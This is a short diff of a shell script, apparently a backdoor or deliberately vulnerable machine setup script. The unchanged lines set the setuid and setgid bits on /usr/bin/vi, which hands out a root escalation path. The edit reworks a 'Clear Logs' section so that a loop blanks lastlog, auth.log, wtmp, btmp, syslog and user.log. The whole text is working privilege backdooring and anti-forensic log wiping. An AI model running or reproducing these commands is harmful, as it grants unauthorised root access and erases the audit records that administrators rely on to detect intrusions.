@@ -50,10 +50,9 @@ chmod u+s /usr/bin/vi
 chmod g+s /usr/bin/vi
 
 # ── Clear Logs ─────────────────────────────────────────────────
-cat /dev/null > /var/log/lastlog
-cat /dev/null > /var/log/auth.log
-cat /dev/null > /var/log/wtmp
-cat /dev/null > /var/log/btmp
-cat /dev/null > /var/log/syslog
+for log in /var/log/lastlog /var/log/auth.log /var/log/wtmp /var/log/btmp /var/log/syslog /var/log/user.log; do
+    [ -f "$log" ] && cat /dev/null > "$log"
+done
+
 
 echo "[+] User setup complete."
